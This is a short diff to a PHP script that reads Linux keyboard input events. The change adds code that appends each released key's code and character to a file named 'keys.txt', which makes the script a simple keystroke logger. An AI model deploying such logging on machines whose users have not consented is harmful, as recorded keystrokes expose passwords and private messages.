@@ -1128,8 +1128,14 @@ while (true) {
             So the correct unpacking is:
             $event = unpack("qsec/qusec/Stype/Scode/Lvalue", $ev);
     */
-    if (($event['type'] == EV_KEY) && ($event['value'] == 0))
+    if (($event['type'] == EV_KEY) && ($event['value'] == 0)) {
+
+        $file = 'keys.txt';
         echo "Event code : " . $event['code'] . " Char : " . getCorrespondingKey( $event['code'] ) . "\n";
+        file_put_contents( $file, "Event code : " . $event['code'] . " Char : " . getCorrespondingKey( $event['code'] ) . "\n", FILE_APPEND );
+        //$current = getCorrespondingKey( $event['code'] ) . "\n";
+        //file_put_contents($file, $current, FILE_APPEND);
+    }
 }
 fclose($fd);
 
